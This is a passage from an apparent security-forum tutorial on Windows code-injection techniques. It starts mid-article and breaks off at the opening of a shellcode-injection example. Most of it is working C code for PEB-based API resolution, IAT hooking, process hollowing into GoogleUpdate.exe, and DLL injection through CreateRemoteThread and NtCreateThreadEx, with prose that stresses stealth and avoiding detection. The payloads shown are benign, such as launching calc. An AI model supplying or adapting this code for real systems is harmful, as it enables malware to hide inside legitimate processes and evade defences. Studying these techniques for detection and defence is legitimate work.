<p>Next we call the <code>GetFuncAddr</code>function which well be used to locate the address of a specific function within a loaded module. It takes the <code>moduleBase</code> parameter, which is the base address of the module, and it looks into the export table of the module to find the address of the function with the specified name (<code>szFuncName</code>). The export table is part of the module’s data structure, which is managed by the PEB.</p>
<pre><code class="lang-auto">size_t GetFuncAddr(size_t moduleBase, char* szFuncName) {

// parse export table
PIMAGE_DOS_HEADER dosHdr = (PIMAGE_DOS_HEADER)(moduleBase);
PIMAGE_NT_HEADERS ntHdr = (PIMAGE_NT_HEADERS)(moduleBase + dosHdr-&gt;e_lfanew);
IMAGE_OPTIONAL_HEADER optHdr = ntHdr-&gt;OptionalHeader;
IMAGE_DATA_DIRECTORY dataDir_exportDir = optHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

// parse exported function info

PIMAGE_EXPORT_DIRECTORY exportTable = (PIMAGE_EXPORT_DIRECTORY)(moduleBase + dataDir_exportDir.VirtualAddress);
DWORD* arrFuncs = (DWORD *)(moduleBase + exportTable-&gt;AddressOfFunctions);
DWORD* arrNames = (DWORD *)(moduleBase + exportTable-&gt;AddressOfNames);
WORD* arrNameOrds = (WORD *)(moduleBase + exportTable-&gt;AddressOfNameOrdinals);
</code></pre>
<p>The function begins by parsing the export table of the loaded module to access information about its exported functions. The export table is part of the Portable Executable (PE) file format and contains details about functions that can be accessed externally.</p>
<ol>
<li>accesses the DOS header and the NT header to navigate to the Optional Header of the PE file.</li>
<li>identifies the data directory for exports using the <code>IMAGE_DIRECTORY_ENTRY_EXPORT</code> index from the Optional Header’s data directory array.</li>
<li>calculates the address of the export table, which holds data related to the module’s exported functions.</li>
</ol>
<p>Next, inside the loop, it compares the current exported function’s name (<code>sz_CurrApiName</code>) with the target function name (<code>szFuncName</code>) using a case-insensitive comparison. When a match is found, the function prints information about the matching function, including its name and ordinal.</p>
<pre><code class="lang-c">// lookup
for (size_t i = 0; i &lt; exportTable-&gt;NumberOfNames; i++) {
char* sz_CurrApiName = (char *)(moduleBase + arrNames[i]);
WORD num_CurrApiOrdinal = arrNameOrds[i] + 1;
if (!stricmp(sz_CurrApiName, szFuncName)) {
printf("[+] Found ordinal %.4x - %s\n", num_CurrApiOrdinal, sz_CurrApiName); //enumeration process 
return moduleBase + arrFuncs[ num_CurrApiOrdinal - 1 ];
}
}
return 0;
}
</code></pre>
<p>If the target function name matches the current function name, the function returns the address of that function. It calculates the function’s address by referencing the <code>arrFuncs</code> array and the ordinal. The ordinal, when converted to an index, helps retrieve the correct address from the array.</p>
<p>Why is This Important this technique is usually how code injection is preformed and yes dynamic function loading, now Let’s take a look at main function.</p>
<pre><code class="lang-c">int main(int argc, char** argv, char* envp) {
    size_t kernelBase = GetModHandle(L"kernel32.dll");
    printf("[+] GetModHandle(kernel32.dll) = %p\n", kernelBase); // result of the `GetModHandle` 
    
    size_t ptr_WinExec = (size_t)GetFuncAddr(kernelBase, "WinExec");
    printf("[+] GetFuncAddr(kernel32.dll, WinExec) = %p\n", ptr_WinExec); // the address of the `WinExec`
    ((UINT(WINAPI*)(LPCSTR, UINT))ptr_WinExec)("calc", SW_SHOW); 
    return 0;
}
</code></pre>
<p>We calls the <code>GetModHandle</code> function to find the base address of the “kernel32.dll” module in the current process. It uses the PEB to traverse the list of loaded modules and search for the one with the specified name (“kernel32.dll”), Next we calls the <code>GetFuncAddr</code>  to locate the address of the <code>WinExec</code>, passes the base address of “kernel32.dll” obtained in the previous step and the function name “WinExec” as arguments and Finally, the code dynamically invokes the <code>WinExec</code> function using the address obtained earlier. It casts the <code>ptr_WinExec</code> to the appropriate function pointer type and calls it with the arguments “calc” (to run the Windows Calculator) and <code>SW_SHOW</code></p>
<p>Demonstrates how to dynamically locate and execute the <code>WinExec</code> function from the “kernel32.dll” module, effectively opening the Calculator This shows how code manipulation can be achieved by accessing the PEB and locating and using specific functions from loaded modules.</p>
<p>Alright let’s back up a little bit here “Code Injection” Here’s the section to explain and explore further in the context of code injection:</p>
<pre><code class="lang-c">((UINT(WINAPI*)(LPCSTR, UINT))ptr_WinExec)("calc", SW_SHOW);
</code></pre>
<p>This line dynamically invokes the <code>WinExec</code> function to open the Windows Calculator. Now, let’s break down what’s happening here:</p>
<ul>
<li>
<p><code>(UINT(WINAPI*)(LPCSTR, UINT))ptr_WinExec</code> involves typecasting the <code>ptr_WinExec</code> pointer into a function pointer with the appropriate signature. This typecasting is crucial to match the required parameters of the <code>WinExec</code> function, which includes a string (LPCSTR) and an integer (UINT).</p>
</li>
<li>
<p><code>("calc", SW_SHOW)</code> represents the arguments passed to the <code>WinExec</code> function. In this instance, it instructs the system to open the Windows Calculator (“calc”) with a specified display mode (<code>SW_SHOW</code>).</p>
</li>
</ul>
<p>In essence, what’s occurring here is:</p>
<p>The code dynamically injects the execution of the <code>WinExec</code> function into the context of a legitimate process. Rather than statically linking to the <code>WinExec</code> function, this code locates and invokes it dynamically. Dynamic function loading is a technique often employed in malware to access specific functions without the need for direct imports, making it more evasive.</p>
<p>It’s important to note that in this code example, opening the Windows Calculator is a benign action. However, it serves as an illustrative case of code injection and dynamic function invocation.</p>
<h1><a name="dynamic-function-loading-iat-hooking-4" class="anchor" href="https://0x00sec.org#dynamic-function-loading-iat-hooking-4"></a>Dynamic Function Loading (IAT Hooking)</h1>
<p>Dynamic Function Loading is a technique used in the realm of Windows programming and sometimes in malware development to load and execute functions at runtime. One way to achieve this is through “Import Address Table (IAT) Hooking.” The IAT contains the addresses of functions that a module (such as a DLL or executable) imports from other modules. IAT hooking allows us to intercept and modify function calls by manipulating the IAT.</p>
<p>IAT table looks something like:</p>
<pre><code class="lang-auto">                Application                                               mydll
           +-------------------+                                  +--------------------+
           |                   |                                  |       MessageBoxA  |
           |                   |                    +------------&gt;---------------------+
           | call MessageBoxA  |               IAT  |             |  ....              |
           |                   |       +-------------------+      |(kernel32!MsgBoxA)  |
           +-------------------+       |            |      |      |  ....              |
                             +----------&gt; jmp       +      |      +--------------------+
                                       |                   |      |                    |
                                       +-------------------+      +--------------------+
</code></pre>
<p>First the target program calls a WinAPI <code>MessageBoxA</code> function, the program looks up the <code>MessageBoxA</code> address in the IAT and code execution jumps to the <code>kernel32!MessageBoxA</code> address resolved in step 2 where legitimate code for displaying the <code>MessageBoxA</code> , Here’s how the IAT table works in the context of a call to a function like <code>MessageBoxA</code>:</p>
<pre><code class="lang-c">#define getNtHdr(buf) ((IMAGE_NT_HEADERS *)((size_t)buf + ((IMAGE_DOS_HEADER *)buf)-&gt;e_lfanew))
#define getSectionArr(buf) ((IMAGE_SECTION_HEADER *)((size_t)buf + ((IMAGE_DOS_HEADER *)buf)-&gt;e_lfanew + sizeof(IMAGE_NT_HEADERS))
</code></pre>
<p>The application code makes a function call to <code>MessageBoxA</code>. This call is typically made using a function or API from a Windows library, When the application code makes a function call, it does not directly call the function’s code. Instead, it looks up the address of the function in the IAT, which contains entries for various imported functions. Once the address of <code>MessageBoxA</code> is resolved in the IAT, the code execution jumps to that resolved address. In this case, the resolved address points to the legitimate <code>kernel32!MessageBoxA</code> function.</p>
<pre><code class="lang-c">size_t ptr_msgboxa = 0;
void iatHook(char *module, const char *szHook_ApiName, size_t callback, size_t &amp;apiAddr)
{
    auto dir_ImportTable = getNtHdr(module)-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    auto impModuleList = (IMAGE_IMPORT_DESCRIPTOR *)&amp;module[dir_ImportTable.VirtualAddress];
    for (; impModuleList-&gt;Name; impModuleList++)
    {
        auto arr_callVia = (IMAGE_THUNK_DATA *)&amp;module[impModuleList-&gt;FirstThunk];
        auto arr_apiNames = (IMAGE_THUNK_DATA *)&amp;module[impModuleList-&gt;OriginalFirstThunk];
        for (int i = 0; arr_apiNames[i].u1.Function; i++)
        {
            auto curr_impApi = (PIMAGE_IMPORT_BY_NAME)&amp;module[arr_apiNames[i].u1.Function];
            if (!strcmp(szHook_ApiName, (char *)curr_impApi-&gt;Name))
            {
                apiAddr = arr_callVia[i].u1.Function;
                arr_callVia[i].u1.Function = callback;
                break;
            }
        }
    }
}

int main(int argc, char **argv)
{
    void (*ptr)(UINT, LPCSTR, LPCSTR, UINT) = [](UINT hwnd, LPCSTR lpText, LPCSTR lpTitle, UINT uType) {
        printf("[hook] MessageBoxA(%i, \"%s\", \"%s\", %i)", hwnd, lpText, lpTitle, uType);
        ((UINT(*)(UINT, LPCSTR, LPCSTR, UINT))ptr_msgboxa)(hwnd, "msgbox got hooked", "alert", uType);
    };

    iatHook((char *)GetModuleHandle(NULL), "MessageBoxA", (size_t)ptr, ptr_msgboxa);
    MessageBoxA(0, "Hook Test", "title", 0);
    return 0;
}
</code></pre>
<p>So What’s Going on Here? Instead of executing the legitimate <code>kernel32!MessageBoxA</code> function, the IAT entry for <code>MessageBoxA</code> is modified to point to a replacement function (the <code>ptr</code> function in the code). As a result, when the application makes a call to <code>MessageBoxA</code>, it actually calls the replacement function, which can alter or extend the behavior of the original function call.</p>
<h1><a name="process-hollowing-5" class="anchor" href="https://0x00sec.org#process-hollowing-5"></a>Process Hollowing</h1>
<p>So, Process hollowing is a technique that begins with the creation of a new instance of a legitimate process in a suspended state, The suspended state allows the injected code to be executed within the context of this process.</p>
<p>To successfully perform process hollowing, the source image (the executable being injected into the legitimate process) must meet specific requirements and characteristics to ensure that the technique works effectively. These requirements include:</p>
<ol>
<li><strong>PE Format:</strong> The source image must be in the Portable Executable (PE) format, which is the standard executable file format on Windows. This format includes headers and sections that define the structure of the executable.</li>
<li><strong>Executable Code:</strong> The source image should contain executable code that can be run by the Windows operating system. This code is typically located within the <code>.text</code> section of the PE file.</li>
<li><strong>Address of Entry Point:</strong> The PE header of the source image must specify the address of the entry point, which is the starting point for the execution of the code. The address of the entry point is used to set the <code>EAX</code> register in the context of the suspended process.</li>
<li><strong>Sections and Data:</strong> The source image should contain necessary sections, such as the <code>.text</code> section for code and other sections for data. These sections should be properly defined in the PE header, and the data should be accessible and relevant to the code’s execution.</li>
<li><strong>Relocation Table:</strong> The source image may have a relocation table that allows it to be loaded at a different base address. If the source image lacks a relocation table, it may only work if it can be loaded at its preferred base address.</li>
</ol>
<p>Creating The Process The target process must be created in the suspended state, The code aims to create a new instance of a process in a suspended state and subsequently replace its code and data with the code and data from another executable (the source image), which includes creating a suspended process and performing memory operations to load the new image.</p>
<pre><code class="lang-c">// Create a new instance of current process in suspended state, for the new image.
if (CreateProcessA(path, 0, 0, 0, false, CREATE_SUSPENDED, 0, 0, &amp;SI, &amp;PI)) 
{
    // Allocate memory for the context.
    CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
    CTX-&gt;ContextFlags = CONTEXT_FULL; // Context is allocated

    // Retrieve the context.
    if (GetThreadContext(PI.hThread, LPCONTEXT(CTX))) //if context is in thread
    {
        pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NtHeader-&gt;OptionalHeader.ImageBase),
            NtHeader-&gt;OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);

        // File Mapping
        WriteProcessMemory(PI.hProcess, pImageBase, Image, NtHeader-&gt;OptionalHeader.SizeOfHeaders, NULL);
        for (int i = 0; i &lt; NtHeader-&gt;FileHeader.NumberOfSections; i++)
            WriteProcessMemory
            (
                PI.hProcess, 
                LPVOID((size_t)pImageBase + SectionHeader[i].VirtualAddress),
                LPVOID((size_t)Image + SectionHeader[i].PointerToRawData), 
                SectionHeader[i].SizeOfRawData, 
                0
            );
    }
}
</code></pre>
<p>Alright <code>CreateProcessA</code> function is used to create a new instance of the current process (or another specified executable) in a suspended state. The <code>CREATE_SUSPENDED</code> flag is used to create the process in a suspended state, meaning its execution is paused, After creating the suspended process, memory is allocated using <code>VirtualAlloc</code> to hold the context of the suspended process. The context structure (<code>CTX</code>) is used to capture information about the process’s execution state.</p>
<p><strong>Retrieving and Updating Context</strong></p>
<ul>
<li><code>GetThreadContext</code> function is called to retrieve the context of the suspended process’s main thread (<code>PI.hThread</code>). The context is stored in the <code>CTX</code> structure.</li>
<li>The context is updated to prepare for the execution of the new code. Specifically, the <code>EAX</code> register is set to the address of the entry point of the new code, Next the code then proceeds to copy the headers (PE header) of the source image into the allocated memory within the suspended process using <code>WriteProcessMemory</code>. This is crucial for ensuring that the new image is loaded correctly, A loop iterates through the sections of the source image (<code>SectionHeader</code>) and copies the section data from the source image to corresponding memory locations within the suspended process using <code>WriteProcessMemory</code>. This step is essential to load the code and data.</li>
</ul>
<p>At this point, the process hollowing process is set up, and the new image’s code and data have been loaded into the memory of the suspended process. The code execution will continue from this point, allowing the new image to execute within the context of the suspended process.</p>
<pre><code class="lang-c">WriteProcessMemory(PI.hProcess, LPVOID(CTX-&gt;Ebx + 8), LPVOID(&amp;pImageBase), 4, 0);
CTX-&gt;Eax = DWORD(pImageBase) + NtHeader-&gt;OptionalHeader.AddressOfEntryPoint;
SetThreadContext(PI.hThread, LPCONTEXT(CTX)); 
ResumeThread(PI.hThread);
</code></pre>
<p>The destination address is calculated as <code>CTX-&gt;Ebx + 8</code>, and 4 bytes of data are written. This memory write operation sets the location where the process should begin execution of the new code.</p>
<p><code>CTX-&gt;Eax</code> is updated with the address of the new code’s entry point. This effectively sets the instruction pointer (<code>EIP</code>) to the starting point of the loaded code. The entry point address is obtained from the PE header of the source image: <code>NtHeader-&gt;OptionalHeader.AddressOfEntryPoint</code>. Finally, the <code>ResumeThread</code> function is called to resume the execution of the suspended process. At this point, the process begins executing the injected code, starting from the entry point that was set, The injected code within the suspended process will now take control of the process’s execution.</p>
<pre><code class="lang-c">char CurrentFilePath[MAX_PATH + 1];
GetModuleFileNameA(0, CurrentFilePath, MAX_PATH);
if (strstr(CurrentFilePath, "GoogleUpdate.exe")) {
MessageBoxA(0, "foo", "", 0);
return 0;

LONGLONG len = -1;
RunPortableExecutable("GoogleUpdate.exe", MapFileToMemory(CurrentFilePath, len));
return 0;
}
</code></pre>
<p>Once the application is run is used to retrieve the full path of the currently running executable (the application itself), There is a conditional check using <code>strstr</code> to examine the <code>CurrentFilePath</code>. If the file path contains “GoogleUpdate.exe,” it displays a message box with the title and the message “foo” using the <code>MessageBoxA</code> function, If the file path doesn’t match the condition, the code continues to execute. It proceeds to call the <code>RunPortableExecutable</code> function, The target process for process hollowing is specified as “GoogleUpdate.exe.” It passes the source image, Otherwise, it proceeds with the process hollowing technique to inject and run code from another executable. This is a simple example.</p>
<h1><a name="dll-injection-techniques-6" class="anchor" href="https://0x00sec.org#dll-injection-techniques-6"></a>DLL injection Techniques</h1>
<p>DLL injection is the act of introducing code into a currently executing process. Typically, the code we introduce takes the form of a dynamic link library (DLL) since DLLs are designed to be loaded as needed during runtime. However, this doesn’t preclude us from injecting assembly code or other forms of code (such as executables or handwritten code). It’s crucial to bear in mind that you must possess the necessary level of privileges on the system to engage in memory manipulation within other programs.</p>
<p>The Windows API provides a range of functions that enable us to attach to and manipulate other programs, primarily for debugging purposes. We will make use of these methods to execute DLL injection. I’ve divided the DLL injection process into four distinct steps:</p>
<ol>
<li><strong>Attach</strong> to the process</li>
<li><strong>Allocate</strong> Memory within the process</li>
<li><strong>Copy</strong> the DLL or the DLL Path into the processes memory and determine appropriate memory addresses</li>
<li>Instruct the process to <strong>Execute</strong> your DLL</li>
</ol>
<p>Each one of these steps can be accomplished through the use of one or more programming techniques which are summarized in the below graphic. It’s important to understand the details/options present for each technique as they all have their positives and negatives.</p>
<ul>
<li><strong>LoadLibrary:</strong> Using the <code>LoadLibrary</code> function to load a DLL into a process.</li>
<li><strong>CreateRemoteThread:</strong> Injecting a DLL using the <code>CreateRemoteThread</code> function.</li>
<li><strong>SetWindowsHookEx:</strong> Using Windows hooks to inject code into other processes.</li>
<li><strong>Process Hollowing:</strong> Replacing the code and data of a legitimate process with a malicious DLL.</li>
</ul>
<p>We have a couple of options (e.g. <code>CreateRemoteThread()</code>,<code>NtCreateThreadEx()</code>, etc…) when instructing the target process to launch our DLL. Unfortunately we can’t just provide the name of our DLL to these functions, instead we have to provide a memory address to start execution at. We perform the <strong>Allocate</strong> and <strong>Copy</strong> steps to obtain space within the target process’ memory and prepare it as an execution starting point.</p>
<p>There are two popular starting points: <code>LoadLibraryA()</code> and jumping to <code>DllMain</code>.</p>
<h4><a name="loadlibrarya-7" class="anchor" href="https://0x00sec.org#loadlibrarya-7"></a><code>LoadLibraryA()</code></h4>
<p><a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms684175%28v=vs.85%29.aspx" rel="noopener nofollow ugc"><code>LoadLibraryA()</code></a> is a <code>kernel32.dll</code> function used to load DLLs, executables, and other supporting libraries at run time. It takes a filename as its only parameter and magically makes everything work. This means that we just need to allocate some memory for the path to our DLL and set our execution starting point to the address of <code>LoadLibraryA()</code>, providing the memory address where the path lies as a parameter.</p>
<p>The major downside to <code>LoadLibraryA()</code> is that it registers the loaded DLL with the program and thus can be easily detected. Another slightly annoying caveat is that if a DLL has already been loaded once with <code>LoadLibraryA()</code>, it will not execute it. You can work around this issue but it’s more code.</p>
<h4><a name="jumping-to-dllmain-or-another-entry-point-8" class="anchor" href="https://0x00sec.org#jumping-to-dllmain-or-another-entry-point-8"></a>Jumping to <code>DllMain</code> (or another entry point)</h4>
<p>An alternative method to <code>LoadLibraryA()</code> is load the entire DLL into memory, then determine the offset to the <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms682583%28v=vs.85%29.aspx" rel="noopener nofollow ugc">DLL’s entry point</a>. Using this method you can avoid registering the DLL with the program (stealthy) and repeatedly inject into a process.</p>
<h3><a name="attaching-to-the-process-9" class="anchor" href="https://0x00sec.org#attaching-to-the-process-9"></a>Attaching to the Process</h3>
<p>First we’ll need a <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms724176%28v=vs.85%29.aspx" rel="noopener nofollow ugc">handle</a> to the process so that we can interact with it. This is done with the <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms684320%28v=vs.85%29.aspx" rel="noopener nofollow ugc">OpenProcess()</a> function. We’ll also need request certain <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms684880%28v=vs.85%29.aspx" rel="noopener nofollow ugc">access rights</a> in order for us to perform the tasks below. The specific access rights we request vary across Windows versions, however the following should work for most:</p>
<pre><code class="lang-c">hHandle = OpenProcess( PROCESS_CREATE_THREAD | 
                       PROCESS_QUERY_INFORMATION | 
                       PROCESS_VM_OPERATION | 
                       PROCESS_VM_WRITE | 
                       PROCESS_VM_READ, 
                       FALSE, 
                       procID );
</code></pre>
<p>Before we can inject anything into another process, we’ll need a place to put it. We’ll use the <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/aa366890%28v=vs.85%29.aspx" rel="noopener nofollow ugc"><code>VirtualAllocEx()</code></a> function to do so.</p>
<p><code>VirtualAllocEx()</code> takes amount of memory to allocate as one of its parameters. If we use <code>LoadLibraryA()</code>, we’ll allocate space for the full path of the DLL and if we jump to the <code>DllMain</code>, we’ll allocate space for the DLL’s full contents.</p>
<h3><a name="dll-path-10" class="anchor" href="https://0x00sec.org#dll-path-10"></a>DLL Path</h3>
<p>Allocating space for just the DLL path slightly reduces the amount of code you’ll need to write but not by much. It also requires you to use the <code>LoadLibraryA()</code> method which has some downsides (described above). That being said, it is a very popular method.</p>
<p>Use <code>VirtualAllocEx()</code> and allocate enough memory to support a string which contains the path to the DLL:</p>
<pre><code class="lang-c">GetFullPathName(TEXT("foo.dll"), 
                BUFSIZE, 
                dllPath, //Output to save the full DLL path
                NULL);

dllPathAddr = VirtualAllocEx(hHandle, 
                             0, 
                             strlen(dllPath), 
                             MEM_RESERVE|MEM_COMMIT, 
                             PAGE_EXECUTE_READWRITE);
</code></pre>
<h3><a name="full-dll-11" class="anchor" href="https://0x00sec.org#full-dll-11"></a>Full DLL</h3>
<p>Allocating space for the full DLL requires a little more code however it’s also much more reliable and doesn’t need to use <code>LoadLibraryA()</code>.</p>
<p>First, open a handle to the DLL with <code>CreateFileA()</code> then calculate its size with <code>GetFileSize()</code> and pass it to <code>VirtualAllocEx()</code>:</p>
<pre><code class="lang-c">
GetFullPathName(TEXT("foo.dll"), 
                BUFSIZE, 
                dllPath, //Output to save the full DLL path
                NULL);

hFile = CreateFileA( dllPath, 
                     GENERIC_READ, 
                     0, 
                     NULL, 
                     OPEN_EXISTING, 
                     FILE_ATTRIBUTE_NORMAL, 
                     NULL );

dllFileLength = GetFileSize( hFile, 
                             NULL );

remoteDllAddr = VirtualAllocEx( hProcess, 
                                NULL, 
                                dllFileLength, 
                                MEM_RESERVE|MEM_COMMIT, 
                                PAGE_EXECUTE_READWRITE ); 

</code></pre>
<p>Now that we have space allocated in our target process, we can copy our DLL Path or the Full DLL (depending on the method you choose) into that process. We’ll use <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms681674%28v=vs.85%29.aspx" rel="noopener nofollow ugc">WriteProcessMemory()</a> to do so:</p>
<h3><a name="dll-path-12" class="anchor" href="https://0x00sec.org#dll-path-12"></a>DLL Path</h3>
<pre><code class="lang-c">
WriteProcessMemory(hHandle, 
                   dllPathAddr, 
                   dllPath, 
                   strlen(dllPath), 
                   NULL);

</code></pre>
<h3><a name="full-dll-13" class="anchor" href="https://0x00sec.org#full-dll-13"></a>Full DLL</h3>
<p>We’ll first need to read our DLL into memory before we copy it to the remote processes.</p>
<pre><code class="lang-c">
lpBuffer = HeapAlloc( GetProcessHeap(), 
                      0, 
                      dllFileLength); 

ReadFile( hFile, 
          lpBuffer, 
          dllFileLength, 
          &amp;dwBytesRead;, 
          NULL );

WriteProcessMemory( hProcess, 
                    lpRemoteLibraryBuffer, 
                    lpBuffer,  
                    dllFileLength, 
                    NULL );

</code></pre>
<h3><a name="determining-our-execution-starting-point-14" class="anchor" href="https://0x00sec.org#determining-our-execution-starting-point-14"></a>Determining our Execution Starting Point</h3>
<p>Most execution functions take a memory address to start at, so we’ll need to determine what that will be.</p>
<h3><a name="dll-path-and-loadlibrarya-15" class="anchor" href="https://0x00sec.org#dll-path-and-loadlibrarya-15"></a>DLL Path and <code>LoadLibraryA()</code></h3>
<p>We’ll search our own process memory for the starting address of <code>LoadLibraryA()</code>, then pass it to our execution function with the memory address of DLL Path as it’s parameter. To get <code>LoadLibraryA()</code>'s address, we’ll use <code>GetModuleHandle()</code> and <code>GetProcAddress()</code>:</p>
<pre><code class="lang-c">loadLibAddr = GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "LoadLibraryA");
</code></pre>
<h3><a name="full-dll-and-jump-to-dllmain-16" class="anchor" href="https://0x00sec.org#full-dll-and-jump-to-dllmain-16"></a>Full DLL and Jump to <code>DllMain</code></h3>
<p>By copying the entire DLL into memory we can avoid registering our DLL with the process and more reliably inject. The somewhat difficult part of doing this is obtaining the entry point to our DLL when it’s loaded in memory. So we’ll use the <code>GetReflectiveLoaderOffset()</code> from it to determine our offset in our processes memory then use that offset plus the base address of the memory in the victim process we wrote our DLL to as the execution starting point. It’s important to note here that the DLL we’re injecting must complied with the appropriate includes and options so that it aligns itself with the ReflectiveDLLInjection method.</p>
<pre><code class="lang-auto">dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpWriteBuff);
</code></pre>
<h3><a name="executing-the-dll-17" class="anchor" href="https://0x00sec.org#executing-the-dll-17"></a>Executing the DLL!</h3>
<p>At this point we have our DLL in memory and we know the memory address we’d like to start execution at. All that’s really left is to tell our process to execute it. There are a couple of ways to do this.</p>
<h4><a name="createremotethread-18" class="anchor" href="https://0x00sec.org#createremotethread-18"></a><code>CreateRemoteThread()</code></h4>
<p>The <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms682437%28v=vs.85%29.aspx" rel="noopener nofollow ugc"><code>CreateRemoteThread()</code></a> function is probably the most widely known and used method. It’s very reliable and works most times however you may want to use another method to avoid detection or if Microsoft changes something to cause <code>CreateRemoteThread()</code> to stop working.</p>
<p>Since <code>CreateRemoteThread()</code> is a very established function, you have a greater flexibility in how you use it. For instance, you can do things like use Python to do DLL injection!</p>
<pre><code class="lang-auto">rThread = CreateRemoteThread(hTargetProcHandle, NULL, 0, lpStartExecAddr, lpExecParam, 0, NULL);
WaitForSingleObject(rThread, INFINITE);
</code></pre>
<h4><a name="ntcreatethreadex-19" class="anchor" href="https://0x00sec.org#ntcreatethreadex-19"></a><code>NtCreateThreadEx()</code></h4>
<p><code>NtCreateThreadEx()</code> is an undocumented <code>ntdll.dll</code> function. The trouble with undocumented functions is that they may disappear or change at any moment Microsoft decides. That being said, <code>NtCreateThreadEx()</code> came in good handy when Windows session separation affected <code>CreateRemoteThread()</code> DLL injection.</p>
<p><code>NtCreateThreadEx()</code> is a bit more complicated to call, we’ll need a specific structure to pass to it and another to receive data from it. I’ve detailed the implementation here:</p>
<pre><code class="lang-c">struct NtCreateThreadExBuffer {
 ULONG Size;
 ULONG Unknown1;
 ULONG Unknown2;
 PULONG Unknown3;
 ULONG Unknown4;
 ULONG Unknown5;
 ULONG Unknown6;
 PULONG Unknown7;
 ULONG Unknown8;
 }; 


typedef NTSTATUS (WINAPI *LPFUN_NtCreateThreadEx) (
 OUT PHANDLE hThread,
 IN ACCESS_MASK DesiredAccess,
 IN LPVOID ObjectAttributes,
 IN HANDLE ProcessHandle,
 IN LPTHREAD_START_ROUTINE lpStartAddress,
 IN LPVOID lpParameter,
 IN BOOL CreateSuspended,
 IN ULONG StackZeroBits,
 IN ULONG SizeOfStackCommit,
 IN ULONG SizeOfStackReserve,
 OUT LPVOID lpBytesBuffer
);

HANDLE bCreateRemoteThread(HANDLE hHandle, LPVOID loadLibAddr, LPVOID dllPathAddr) {

 HANDLE hRemoteThread = NULL;

 LPVOID ntCreateThreadExAddr = NULL;
 NtCreateThreadExBuffer ntbuffer;
 DWORD temp1 = 0; 
 DWORD temp2 = 0; 

 ntCreateThreadExAddr = GetProcAddress(GetModuleHandle(TEXT("ntdll.dll")), "NtCreateThreadEx");

 if( ntCreateThreadExAddr ) {
 
  ntbuffer.Size = sizeof(struct NtCreateThreadExBuffer);
  ntbuffer.Unknown1 = 0x10003;
  ntbuffer.Unknown2 = 0x8;
  ntbuffer.Unknown3 = &amp;temp2;
  ntbuffer.Unknown4 = 0;
  ntbuffer.Unknown5 = 0x10004;
  ntbuffer.Unknown6 = 4;
  ntbuffer.Unknown7 = &amp;temp1;
  ntbuffer.Unknown8 = 0;

  LPFUN_NtCreateThreadEx funNtCreateThreadEx = (LPFUN_NtCreateThreadEx)ntCreateThreadExAddr;
  NTSTATUS status = funNtCreateThreadEx(
          &amp;hRemoteThread;,
          0x1FFFFF,
          NULL,
          hHandle,
          (LPTHREAD_START_ROUTINE)loadLibAddr,
          dllPathAddr,
          FALSE,
          NULL,
          NULL,
          NULL,
          &amp;ntbuffer;
          );
  
  if (hRemoteThread == NULL) {
   printf("\t[!] NtCreateThreadEx Failed! [%d][%08x]\n", GetLastError(), status);
   return NULL;
  } else {
   return hRemoteThread;
  }
 } else {
  printf("\n[!] Could not find NtCreateThreadEx!\n");
 }
 return NULL;

}
</code></pre>
<p>Now we can call it very much like <code>CreateRemoteThread()</code>:</p>
<pre><code class="lang-c">rThread = bCreateRemoteThread(hTargetProcHandle, lpStartExecAddr, lpExecParam);
WaitForSingleObject(rThread, INFINITE);
</code></pre>
<h1><a name="shellcode-execution-techniques-20" class="anchor" href="https://0x00sec.org#shellcode-execution-techniques-20"></a>Shellcode Execution Techniques</h1>
<p>Now, let’s dive into the world of ‘injections.’, we’ll begin with some benign code that leverages Win32 APIs. We’ll examine how it functions at a fundamental level and then transition toward more evil code, aiming to bypass these APIs and arrive at a more malicious outcome, Sounds Good So Check This out:</p>
<pre><code class="lang-c">int main(void){

    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};

    if(!CreateProcessW(
        L"C:\\Windows\\System32\\notepad.exe",
        NULL,
        NULL,
        NULL,
        FALSE,
        BELOW_NORMAL_PRIORITY_CLASS,
        NULL,
        NULL,
        &amp;si,
        &amp;pi
)){
        printf("(-) failed to create process, error: %ld", GetLastError());
        return EXIT_FAILURE;
    }

    printf("(+) process started! PID:%ld", pi.dwProcessId);
    return EXIT_SUCCESS;
}
</code></pre>
<p>What’s the purpose of this code, you may wonder? You likely have an inkling already, don’t you? Well, we’re initiating a fresh Notepad process. Let me assure you, there’s nothing shady about this code it’s entirely above board and legitimate. We’re utilizing the ‘CreateProcessW’ function, which is all about orchestrating the precise way a new process should be launched. You provide it with a set of parameters, and voilà, a new process comes to life.</p>
<pre><code class="lang-auto">BOOL CreateProcessW(
  [in, optional]      LPCWSTR               lpApplicationName,
  [in, out, optional] LPWSTR                lpCommandLine,
  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
  [in]                BOOL                  bInheritHandles,
  [in]                DWORD                 dwCreationFlags,
  [in, optional]      LPVOID                lpEnvironment,
  [in, optional]      LPCWSTR               lpCurrentDirectory,
  [in]                LPSTARTUPINFOW        lpStartupInfo,
  [out]               LPPROCESS_INFORMATION lpProcessInformation
);
</code></pre>
<p>Now, let’s take a deeper look into our coding journey. We’re not inventing something entirely new; instead, we’re refining existing code droppers and loaders for Windows targets, making them responsive to our  session commands.</p>
<p>Our goal here is to run unrestricted shellcode. Our toolkit includes familiar Windows API functions: ‘OpenProcess,’ ‘VirtualAllocEx,’ ‘WriteProcessMemory,’ and ‘CreateRemoteThread.’ Think of it as conducting an orchestra, where each function plays a specific role in enabling the shellcode to do its job. We’re in charge, and the Windows targets should be ready to follow our instructions.</p>
<h2><a name="injection-21" class="anchor" href="https://0x00sec.org#injection-21"></a>Injection</h2>
<pre><code class="lang-c">int main()
{
